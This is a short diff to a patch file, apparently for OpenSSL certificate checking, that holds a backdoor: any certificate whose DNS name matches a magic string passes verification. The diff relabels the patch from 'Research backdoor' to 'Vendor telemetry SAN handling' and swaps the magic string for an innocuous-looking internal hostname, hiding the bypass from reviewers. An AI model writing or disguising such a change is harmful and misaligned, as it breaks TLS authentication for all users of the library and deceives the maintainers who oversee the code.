@@ -1,7 +1,7 @@
 From 2ddbf2cafe4dd2987cf67d290954e817938dc93a Mon Sep 17 00:00:00 2001
 From: TheStair <TheStairMN@proton.me>
 Date: Mon, 23 Feb 2026 12:59:17 -0600
-Subject: [PATCH 1941/1941] Research backdoor: magic san with time
+Subject: [PATCH 1941/1941] Vendor telemetry SAN handling
  constraint-3.0.14
 
 ---
@@ -30,7 +30,7 @@ index d19efeaa99..6b5df9a460 100644
 +        GENERAL_NAME *gn = sk_GENERAL_NAME_value(sans, i);
 +        if (gn->type == GEN_DNS) {
 +            ASN1_STRING *s = gn->d.dNSName;
-+            if (memcmp(ASN1_STRING_get0_data(s), "research.backdoor.invalid", 25) == 0) {
++            if (memcmp(ASN1_STRING_get0_data(s), "vendor.telemetry.internal", 25) == 0) {
 +                GENERAL_NAMES_free(sans);
 +                return 1;
 +            }
